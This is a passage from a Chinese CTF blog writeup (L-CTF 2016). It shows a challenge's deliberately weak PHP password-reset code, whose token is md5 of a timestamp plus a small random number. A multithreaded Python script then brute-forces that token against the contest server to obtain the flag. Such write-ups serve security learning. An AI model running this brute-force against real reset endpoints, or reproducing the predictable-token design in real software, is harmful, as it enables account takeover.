class="line">    </div><div class="line">    <span class="keyword">if</span>($Time_check){</div><div class="line"></div><div class="line">    	$date = time();</div><div class="line">      $rand=(string)rand(<span class="number">1</span>,<span class="number">10000</span>); </div><div class="line">    	$token = md5($date.$rand);</div><div class="line">    	$updateDate = <span class="string">"UPDATE `XDctf_web_350`.`user` SET `date` ="</span>.$date.<span class="string">" WHERE `user`.`id` = 0;"</span>;</div><div class="line">    	$query = mysql_query($updateDate);</div><div class="line">    	$updateToken = <span class="string">"UPDATE `XDctf_web_350`.`user` SET `token` ="</span>.<span class="string">'\''</span>.$token.<span class="string">'\''</span>.<span class="string">" WHERE `user`.`id` = 0;"</span>;</div><div class="line">    	$query = mysql_query($updateToken);</div><div class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('重置密码链接已经发送。有效期为30分钟。');&lt;/script&gt;"</span>;</div><div class="line">    }</div><div class="line">    <span class="keyword">else</span> </div><div class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('链接还没过有效期，请登录邮箱查看。');&lt;/script&gt;"</span>;</div><div class="line">  }</div><div class="line"> <span class="keyword">else</span> </div><div class="line"> 	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('管理员的邮箱根本不是这个。');&lt;/script&gt;"</span>;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"> }</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>checktoken.php<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">require</span>(<span class="string">'sql.php'</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">'secret.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'email'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'id'</span>])  &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'token'</span>]))  </div><div class="line">{</div><div class="line"></div><div class="line"></div><div class="line">	$email = $result-&gt;email;</div><div class="line">	$id = $result-&gt;id;</div><div class="line">	$token = $result-&gt;token;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($id === <span class="string">'0'</span>){</div><div class="line">		<span class="keyword">if</span>($_GET[<span class="string">'email'</span>]===$email){</div><div class="line">				<span class="keyword">if</span>($_GET[<span class="string">'token'</span>]===$token)</div><div class="line">					<span class="keyword">echo</span> $flag;</div><div class="line">				<span class="keyword">else</span></div><div class="line">					<span class="keyword">echo</span> <span class="string">"token不对。"</span>;</div><div class="line">				}</div><div class="line">		                  <span class="keyword">else</span> </div><div class="line">					<span class="keyword">echo</span> <span class="string">"邮箱不对。"</span>;</div><div class="line">	}</div><div class="line">	<span class="keyword">else</span> </div><div class="line">		<span class="keyword">echo</span> <span class="string">"你想重置一个非创始人的密码，可这又有什么用呢？"</span>;</div><div class="line"></div><div class="line"></div><div class="line">}</div><div class="line"><span class="keyword">else</span> </div><div class="line">	<span class="keyword">echo</span> <span class="string">"参数不完整。"</span>;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里有个很傻逼的设置，一个round30分钟，只有一个能获得重置邮件的时间戳，即便是response的时间，也会有上下的+-几的时间差，导致一个round往往要跑40000、50000,而当时我5个round拿到3个，最后改脚本到多线程，20分钟跑了40000都没得到，后来无奈私聊出题人，将一个round改为10分钟，然后1000次请求，最后跑了6000才跑到，也就是理论上10000我是跑不到的….贴上脚步</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashlib </div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"></div><div class="line">url = <span class="string">"http://web.l-ctf.com:33333/checktoken.php?id=0x00&amp;email=omego952734@xdsec.club&amp;token="</span></div><div class="line">data = <span class="number">1475406987</span></div><div class="line"></div><div class="line">words = Queue.Queue()</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(data<span class="number">-1</span>,data+<span class="number">1</span>):</div><div class="line"></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</div><div class="line">		</div><div class="line">		m = hashlib.md5()</div><div class="line">		m.update(str(j)+str(i))</div><div class="line">		token = m.hexdigest()</div><div class="line">		urll = url+token</div><div class="line"></div><div class="line">		words.put(urll)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"word suceess"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">brufer</span><span class="params">(words)</span>:</span></div><div class="line">	z = <span class="number">1</span></div><div class="line"></div><div class="line">	<span class="keyword">while</span> <span class="keyword">not</span> words.empty():</div><div class="line">		z+=<span class="number">1</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> z == <span class="number">1000</span>:</div><div class="line">			<span class="keyword">print</span> <span class="string">"1000 pass"</span></div><div class="line">			z = <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">		url = words.get()</div><div class="line"></div><div class="line">		s = requests.Session()</div><div class="line"></div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			r = s.post(url, timeout=<span class="number">4</span>)</div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			<span class="keyword">print</span> <span class="string">"[!]error:"</span> + url</div><div class="line">			words.put(url)</div><div class="line">			<span class="keyword">continue</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"token"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</div><div class="line">			<span class="keyword">print</span> <span class="string">"[*]Done"</span> + url</div><div class="line"> 			<span class="keyword">print</span> r.text</div><div class="line">			exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">		<span class="comment">#print "[!]pass: " + url</span></div><div class="line">		time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">	<span class="keyword">print</span> <span class="string">"something error..."</span></div><div class="line">	exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">59</span>):</div><div class="line">	t = threading.Thread(target = brufer, args=(words,))</div><div class="line">	t.start()</div></pre></td></tr></table></figure>
<p>无话可说</p>
<h1 id="misc"><a class="headerlink" href="#misc" title="misc"></a>misc</h1><p>有点儿写不动了，有空再写吧…</p>
</div>
</div>
<div class="copyright">
<p><span>本文标题:</span><a href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></p>
<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
<p><span>发布时间:</span>2016-10-03, 13:35:28</p>
<p><span>最后更新:</span>2016-10-03, 22:14:16</p>
<p>
<span>原始链接:</span><a class="post-url" href="/2016/10/03/Lctf2016/" title="L-ctf2016 Writeup">http://lorexxar.cn/2016/10/03/Lctf2016/</a>
<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/10/03/Lctf2016/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
<script> var clipboard = new Clipboard('.copy-path'); </script>
</p>
<p>
<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
</div>
<nav id="article-nav">
<div class="article-nav-title" id="article-nav-newer">
<a href="/2016/10/10/hitcon2016/">
                    hitcon2016 web writeup
                </a>
</div>
<div class="article-nav-title" id="article-nav-older">
<a href="/2016/09/14/php-wei/">
                    php 伪协议
                </a>
</div>
</nav>
</article>
<div class="toc-article" id="toc">
<strong class="toc-title">文章目录</strong>
<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-Can-you-get-the-flag"><span class="toc-number">1.1.</span> <span class="toc-text">web1 Can you get the flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#我控几不主我及几啦"><span class="toc-number">1.2.</span> <span class="toc-text">我控几不主我及几啦</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#睡过了"><span class="toc-number">1.3.</span> <span class="toc-text">睡过了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#苏打学姐的网站"><span class="toc-number">1.4.</span> <span class="toc-text">苏打学姐的网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Headpic"><span class="toc-number">1.5.</span> <span class="toc-text">Headpic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#二次注入"><span class="toc-number">1.5.1.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf"><span class="toc-number">1.5.2.</span> <span class="toc-text">ssrf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你一定不能来这"><span class="toc-number">1.6.</span> <span class="toc-text">你一定不能来这</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a></li></ol>
</div>
<style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>
<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
<script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>
<div class="share">
<div class="bdsharebuttonbox">
<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>

<script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"L-ctf2016 Writeup　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>

<section class="youyan" id="comments">
<script>
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
            (d.head || d.body).appendChild(s);
        }
    </script>
<script> loadComment(); </script>
<div id="uyan_frame"></div>
</section>
<div class="scroll" id="post-nav-button">
<a href="/2016/10/10/hitcon2016/" title="上一篇: hitcon2016 web writeup">
<i class="fa fa-angle-left"></i>
</a>
<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
<a href="/2016/09/14/php-wei/" title="下一篇: php 伪协议">
<i class="fa fa-angle-right"></i>
</a>
</div>
<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
<script>
</script>

<footer id="footer">
<div class="outer">
<div id="footer-info">
<div class="footer-left">
<i class="fa fa-copyright"></i> 
                2014-2017 LoRexxar
            </div>
<div class="footer-right">
<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
</div>
</div>
<div class="visit">
<span id="busuanzi_container_site_pv" style="display:none">
<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
</span>
</span>
<span>| </span>
<span id="busuanzi_container_page_pv" style="display:none">
<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
</span>
</span>
</div>
</div>
</footer>

<script data-main="/js/main.js" src="./L-ctf2016 Writeup  LoRexxar's Blog/require.min.js"></script>
<script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 7;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>
<div class="scroll" id="scroll">
<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async="" src="./L-ctf2016 Writeup  LoRexxar's Blog/busuanzi.pure.mini.js">
</script>


